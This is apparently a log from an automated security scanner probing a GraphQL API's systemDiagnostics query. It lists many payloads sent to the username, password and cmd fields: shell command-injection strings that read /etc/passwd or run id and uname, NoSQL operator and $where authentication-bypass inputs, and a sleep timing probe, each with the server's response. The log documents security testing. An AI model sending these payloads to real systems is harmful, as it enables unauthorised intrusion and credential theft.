2026-02-03 20:06:25,455 | INFO    | GraphQLClient        | -                              | introspection        | POST | success  |  0.514s | payload=[__schema] response=[{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "pastes", "args": [{"name": "public", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}, {"name": "limit", "type"…]
2026-02-03 20:28:55,218 | INFO    | InjectionTester      | semicolon_uname                | systemDiagnostics.username | POST | success  |  0.011s | payload=[;uname -a] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,228 | INFO    | InjectionTester      | pipe_uname                     | systemDiagnostics.username | POST | success  |  0.009s | payload=[|uname -a] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,237 | INFO    | InjectionTester      | double_pipe_uname              | systemDiagnostics.username | POST | success  |  0.009s | payload=[||uname -a] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,247 | INFO    | InjectionTester      | and_uname                      | systemDiagnostics.username | POST | success  |  0.010s | payload=[&& uname -a] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,257 | INFO    | InjectionTester      | backtick_cat_passwd            | systemDiagnostics.username | POST | success  |  0.010s | payload=[`cat /etc/passwd`] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,267 | INFO    | InjectionTester      | backtick_id                    | systemDiagnostics.username | POST | success  |  0.009s | payload=[`id`] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,276 | INFO    | InjectionTester      | backtick_uname                 | systemDiagnostics.username | POST | success  |  0.009s | payload=[`uname -a`] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,286 | INFO    | InjectionTester      | dollar_cat_passwd              | systemDiagnostics.username | POST | success  |  0.009s | payload=[$(cat /etc/passwd)] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,295 | INFO    | InjectionTester      | dollar_id                      | systemDiagnostics.username | POST | success  |  0.009s | payload=[$(id)] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,304 | INFO    | InjectionTester      | dollar_uname                   | systemDiagnostics.username | POST | success  |  0.009s | payload=[$(uname -a)] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,314 | INFO    | InjectionTester      | plain_uname                    | systemDiagnostics.username | POST | success  |  0.010s | payload=[uname -a] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,324 | INFO    | InjectionTester      | chain_semicolon                | systemDiagnostics.username | POST | success  |  0.009s | payload=[;cat /etc/passwd;id] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,334 | INFO    | InjectionTester      | chain_pipe                     | systemDiagnostics.username | POST | success  |  0.010s | payload=[|cat /etc/passwd|id] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,343 | INFO    | InjectionTester      | chain_and                      | systemDiagnostics.username | POST | success  |  0.009s | payload=[&&cat /etc/passwd&&id] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,352 | INFO    | InjectionTester      | plain_cat_passwd               | systemDiagnostics.username | POST | success  |  0.009s | payload=[cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,362 | INFO    | InjectionTester      | space_semicolon_cat            | systemDiagnostics.username | POST | success  |  0.009s | payload=[; cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,371 | INFO    | InjectionTester      | space_pipe_cat                 | systemDiagnostics.username | POST | success  |  0.009s | payload=[| cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,382 | INFO    | InjectionTester      | space_and_cat                  | systemDiagnostics.username | POST | success  |  0.010s | payload=[&& cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,384 | INFO    | InjectionTester      | mongo_ne_operator              | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$ne": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$ne\": \"\"}\", password: \"changeme\", cmd: \"test\") }\n                   …]
2026-02-03 20:28:55,386 | INFO    | InjectionTester      | mongo_gt_operator              | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$gt\": \"\"}\", password: \"changeme\", cmd: \"test\") }\n                   …]
2026-02-03 20:28:55,388 | INFO    | InjectionTester      | mongo_gte_operator             | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$gte\": \"\"}\", password: \"changeme\", cmd: \"test\") }\n                  …]
2026-02-03 20:28:55,390 | INFO    | InjectionTester      | mongo_lt_operator              | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$lt\": \"~\"}\", password: \"changeme\", cmd: \"test\") }\n                  …]
2026-02-03 20:28:55,392 | INFO    | InjectionTester      | mongo_regex_all                | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$regex\": \".*\"}\", password: \"changeme\", cmd: \"test\") }\n              …]
2026-02-03 20:28:55,395 | INFO    | InjectionTester      | mongo_regex_admin              | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$regex\": \"^admin\"}\", password: \"changeme\", cmd: \"test\") }\n          …]
2026-02-03 20:28:55,397 | INFO    | InjectionTester      | mongo_in_operator              | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$in\": [\"admin\", \"root\", \"test\"]}\", password: \"changeme\", cmd: \"tes…]
2026-02-03 20:28:55,399 | INFO    | InjectionTester      | mongo_nin_operator             | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$nin\": [\"impossible_value_xyz\"]}\", password: \"changeme\", cmd: \"test\")…]
2026-02-03 20:28:55,401 | INFO    | InjectionTester      | mongo_exists_true              | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$exists\": true}\", password: \"changeme\", cmd: \"test\") }\n               …]
2026-02-03 20:28:55,403 | INFO    | InjectionTester      | mongo_or_bypass                | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$or": [{"": ""}, {"$gt": ""}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$or\": [{\"\": \"\"}, {\"$gt\": \"\"}]}\", password: \"changeme\", cmd: \"tes…]
2026-02-03 20:28:55,414 | INFO    | InjectionTester      | mongo_where_true               | systemDiagnostics.username | POST | success  |  0.011s | payload=[' || true || '] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,423 | INFO    | InjectionTester      | mongo_where_1_eq_1             | systemDiagnostics.username | POST | success  |  0.009s | payload=[1' || '1'=='1] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,433 | INFO    | InjectionTester      | mongo_where_sleep              | systemDiagnostics.username | POST | success  |  0.009s | payload=[';sleep(5000);'] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,444 | INFO    | InjectionTester      | mongo_where_this               | systemDiagnostics.username | POST | success  |  0.010s | payload=[' || this.password || '] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,454 | INFO    | InjectionTester      | mongo_where_function           | systemDiagnostics.username | POST | success  |  0.010s | payload=[';return true;var x='] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,465 | INFO    | InjectionTester      | mongo_where_tojsononeline      | systemDiagnostics.username | POST | success  |  0.011s | payload=[' || tojsononeline(this) || '] response=[{"data": {"systemDiagnostics": "Username is invalid"}}]
2026-02-03 20:28:55,468 | INFO    | InjectionTester      | graphql_nested_ne              | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected :, found String \": {\"\n\n1: query { systemDiagnostics(username: \"{\"password\": {\"$ne\": \"\"}}\", password: \"changeme\", cmd: \"test…]
2026-02-03 20:28:55,470 | INFO    | InjectionTester      | graphql_nested_gt              | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"password": {"$gt": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected :, found String \": {\"\n\n1: query { systemDiagnostics(username: \"{\"password\": {\"$gt\": \"\"}}\", password: \"changeme\", cmd: \"test…]
2026-02-03 20:28:55,472 | INFO    | InjectionTester      | graphql_nested_regex           | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"username": {"$regex": ".*"}, "password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected :, found String \": {\"\n\n1: query { systemDiagnostics(username: \"{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$ne\": \"\"}}\",…]
2026-02-03 20:28:55,474 | INFO    | InjectionTester      | graphql_array_injection        | systemDiagnostics.username | POST | success  |  0.002s | payload=[["admin", {"$gt": ""}]] response=[{"errors": [{"message": "Syntax Error GraphQL (1:45) Expected :, found String \", {\"\n\n1: query { systemDiagnostics(username: \"[\"admin\", {\"$gt\": \"\"}]\", password: \"changeme\", cmd: \"test\")…]
2026-02-03 20:28:55,476 | INFO    | InjectionTester      | auth_bypass_ne_empty           | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$ne": null}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$ne\": null}\", password: \"changeme\", cmd: \"test\") }\n                   …]
2026-02-03 20:28:55,478 | INFO    | InjectionTester      | auth_bypass_gt_empty           | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$gt\": \"\"}\", password: \"changeme\", cmd: \"test\") }\n                   …]
2026-02-03 20:28:55,480 | INFO    | InjectionTester      | auth_bypass_regex_wildcard     | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$regex\": \".*\"}\", password: \"changeme\", cmd: \"test\") }\n              …]
2026-02-03 20:28:55,482 | INFO    | InjectionTester      | auth_bypass_ne_null            | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$ne": "impossible_password_that_never_matches"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$ne\": \"impossible_password_that_never_matches\"}\", password: \"changeme\",…]
2026-02-03 20:28:55,484 | INFO    | InjectionTester      | auth_bypass_or                 | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$or": [{"$gt": ""}, {"$regex": ".*"}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$or\": [{\"$gt\": \"\"}, {\"$regex\": \".*\"}]}\", password: \"changeme\", cm…]
2026-02-03 20:28:55,486 | INFO    | InjectionTester      | blind_true_ne                  | systemDiagnostics.username | POST | success  |  0.002s | payload=[{"$ne": "definitely_not_this_value_12345"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:40) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"{\"$ne\": \"definitely_not_this_value_12345\"}\", password: \"changeme\", cmd: \…]
2026-02-03 20:28:55,496 | INFO    | InjectionTester      | semicolon_id                   | systemDiagnostics.password | POST | success  |  0.010s | payload=[;id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,508 | INFO    | InjectionTester      | pipe_id                        | systemDiagnostics.password | POST | success  |  0.011s | payload=[|id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,518 | INFO    | InjectionTester      | double_pipe_id                 | systemDiagnostics.password | POST | success  |  0.010s | payload=[||id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,528 | INFO    | InjectionTester      | and_id                         | systemDiagnostics.password | POST | success  |  0.009s | payload=[&& id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,537 | INFO    | InjectionTester      | semicolon_cat_passwd           | systemDiagnostics.password | POST | success  |  0.009s | payload=[;cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,547 | INFO    | InjectionTester      | pipe_cat_passwd                | systemDiagnostics.password | POST | success  |  0.010s | payload=[|cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,557 | INFO    | InjectionTester      | double_pipe_cat_passwd         | systemDiagnostics.password | POST | success  |  0.009s | payload=[||cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,567 | INFO    | InjectionTester      | and_cat_passwd                 | systemDiagnostics.password | POST | success  |  0.009s | payload=[&& cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,576 | INFO    | InjectionTester      | semicolon_uname                | systemDiagnostics.password | POST | success  |  0.009s | payload=[;uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,586 | INFO    | InjectionTester      | pipe_uname                     | systemDiagnostics.password | POST | success  |  0.009s | payload=[|uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,597 | INFO    | InjectionTester      | double_pipe_uname              | systemDiagnostics.password | POST | success  |  0.011s | payload=[||uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,608 | INFO    | InjectionTester      | and_uname                      | systemDiagnostics.password | POST | success  |  0.011s | payload=[&& uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,619 | INFO    | InjectionTester      | backtick_cat_passwd            | systemDiagnostics.password | POST | success  |  0.010s | payload=[`cat /etc/passwd`] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,628 | INFO    | InjectionTester      | backtick_id                    | systemDiagnostics.password | POST | success  |  0.009s | payload=[`id`] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,639 | INFO    | InjectionTester      | backtick_uname                 | systemDiagnostics.password | POST | success  |  0.010s | payload=[`uname -a`] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,648 | INFO    | InjectionTester      | dollar_cat_passwd              | systemDiagnostics.password | POST | success  |  0.009s | payload=[$(cat /etc/passwd)] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,659 | INFO    | InjectionTester      | dollar_id                      | systemDiagnostics.password | POST | success  |  0.010s | payload=[$(id)] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,669 | INFO    | InjectionTester      | dollar_uname                   | systemDiagnostics.password | POST | success  |  0.010s | payload=[$(uname -a)] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,680 | INFO    | InjectionTester      | plain_uname                    | systemDiagnostics.password | POST | success  |  0.010s | payload=[uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,689 | INFO    | InjectionTester      | chain_semicolon                | systemDiagnostics.password | POST | success  |  0.009s | payload=[;cat /etc/passwd;id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,699 | INFO    | InjectionTester      | chain_pipe                     | systemDiagnostics.password | POST | success  |  0.009s | payload=[|cat /etc/passwd|id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,709 | INFO    | InjectionTester      | chain_and                      | systemDiagnostics.password | POST | success  |  0.010s | payload=[&&cat /etc/passwd&&id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,720 | INFO    | InjectionTester      | plain_cat_passwd               | systemDiagnostics.password | POST | success  |  0.011s | payload=[cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,730 | INFO    | InjectionTester      | space_semicolon_cat            | systemDiagnostics.password | POST | success  |  0.009s | payload=[; cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,740 | INFO    | InjectionTester      | space_pipe_cat                 | systemDiagnostics.password | POST | success  |  0.009s | payload=[| cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,751 | INFO    | InjectionTester      | space_and_cat                  | systemDiagnostics.password | POST | success  |  0.011s | payload=[&& cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,753 | INFO    | InjectionTester      | mongo_ne_operator              | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$ne": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$ne\": \"\"}\", cmd: \"test\") }\n                      …]
2026-02-03 20:28:55,755 | INFO    | InjectionTester      | mongo_gt_operator              | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$gt\": \"\"}\", cmd: \"test\") }\n                      …]
2026-02-03 20:28:55,757 | INFO    | InjectionTester      | mongo_gte_operator             | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$gte\": \"\"}\", cmd: \"test\") }\n                     …]
2026-02-03 20:28:55,759 | INFO    | InjectionTester      | mongo_lt_operator              | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$lt\": \"~\"}\", cmd: \"test\") }\n                     …]
2026-02-03 20:28:55,761 | INFO    | InjectionTester      | mongo_regex_all                | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$regex\": \".*\"}\", cmd: \"test\") }\n                 …]
2026-02-03 20:28:55,763 | INFO    | InjectionTester      | mongo_regex_admin              | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$regex\": \"^admin\"}\", cmd: \"test\") }\n             …]
2026-02-03 20:28:55,765 | INFO    | InjectionTester      | mongo_in_operator              | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$in\": [\"admin\", \"root\", \"test\"]}\", cmd: \"test\"…]
2026-02-03 20:28:55,767 | INFO    | InjectionTester      | mongo_nin_operator             | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$nin\": [\"impossible_value_xyz\"]}\", cmd: \"test\") }\…]
2026-02-03 20:28:55,769 | INFO    | InjectionTester      | mongo_exists_true              | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$exists\": true}\", cmd: \"test\") }\n                  …]
2026-02-03 20:28:55,771 | INFO    | InjectionTester      | mongo_or_bypass                | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$or": [{"": ""}, {"$gt": ""}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$or\": [{\"\": \"\"}, {\"$gt\": \"\"}]}\", cmd: \"test\"…]
2026-02-03 20:28:55,787 | INFO    | InjectionTester      | mongo_where_true               | systemDiagnostics.password | POST | success  |  0.015s | payload=[' || true || '] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,800 | INFO    | InjectionTester      | mongo_where_1_eq_1             | systemDiagnostics.password | POST | success  |  0.013s | payload=[1' || '1'=='1] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,811 | INFO    | InjectionTester      | mongo_where_sleep              | systemDiagnostics.password | POST | success  |  0.010s | payload=[';sleep(5000);'] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,821 | INFO    | InjectionTester      | mongo_where_this               | systemDiagnostics.password | POST | success  |  0.010s | payload=[' || this.password || '] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,832 | INFO    | InjectionTester      | mongo_where_function           | systemDiagnostics.password | POST | success  |  0.010s | payload=[';return true;var x='] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,841 | INFO    | InjectionTester      | mongo_where_tojsononeline      | systemDiagnostics.password | POST | success  |  0.009s | payload=[' || tojsononeline(this) || '] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-03 20:28:55,844 | INFO    | InjectionTester      | graphql_nested_ne              | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:67) Expected :, found String \": {\"\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"password\": {\"$ne\": \"\"}}\", cmd: \"test\")…]
2026-02-03 20:28:55,846 | INFO    | InjectionTester      | graphql_nested_gt              | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"password": {"$gt": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:67) Expected :, found String \": {\"\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"password\": {\"$gt\": \"\"}}\", cmd: \"test\")…]
2026-02-03 20:28:55,848 | INFO    | InjectionTester      | graphql_nested_regex           | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"username": {"$regex": ".*"}, "password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:67) Expected :, found String \": {\"\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"username\": {\"$regex\": \".*\"}, \"password\"…]
2026-02-03 20:28:55,850 | INFO    | InjectionTester      | graphql_array_injection        | systemDiagnostics.password | POST | success  |  0.002s | payload=[["admin", {"$gt": ""}]] response=[{"errors": [{"message": "Syntax Error GraphQL (1:64) Expected :, found String \", {\"\n\n1: query { systemDiagnostics(username: \"admin\", password: \"[\"admin\", {\"$gt\": \"\"}]\", cmd: \"test\") }\…]
2026-02-03 20:28:55,853 | INFO    | InjectionTester      | auth_bypass_ne_empty           | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$ne": null}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$ne\": null}\", cmd: \"test\") }\n                      …]
2026-02-03 20:28:55,855 | INFO    | InjectionTester      | auth_bypass_gt_empty           | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$gt\": \"\"}\", cmd: \"test\") }\n                      …]
2026-02-03 20:28:55,857 | INFO    | InjectionTester      | auth_bypass_regex_wildcard     | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$regex\": \".*\"}\", cmd: \"test\") }\n                 …]
2026-02-03 20:28:55,859 | INFO    | InjectionTester      | auth_bypass_ne_null            | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$ne": "impossible_password_that_never_matches"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$ne\": \"impossible_password_that_never_matches\"}\", cm…]
2026-02-03 20:28:55,861 | INFO    | InjectionTester      | auth_bypass_or                 | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$or": [{"$gt": ""}, {"$regex": ".*"}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$or\": [{\"$gt\": \"\"}, {\"$regex\": \".*\"}]}\", cmd: …]
2026-02-03 20:28:55,863 | INFO    | InjectionTester      | blind_true_ne                  | systemDiagnostics.password | POST | success  |  0.002s | payload=[{"$ne": "definitely_not_this_value_12345"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:59) Expected Name, found $\n\n1: query { systemDiagnostics(username: \"admin\", password: \"{\"$ne\": \"definitely_not_this_value_12345\"}\", cmd: \"te…]
2026-02-03 20:28:55,877 | INFO    | InjectionTester      | semicolon_id                   | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[;id] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:55,893 | INFO    | InjectionTester      | pipe_id                        | systemDiagnostics.cmd | POST | success  |  0.015s | payload=[|id] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:55,907 | INFO    | InjectionTester      | double_pipe_id                 | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[||id] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:55,919 | INFO    | InjectionTester      | and_id                         | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[&& id] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-03 20:28:55,932 | INFO    | InjectionTester      | semicolon_cat_passwd           | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[;cat /etc/passwd] response=[{"data": {"systemDiagnostics": ""}}]
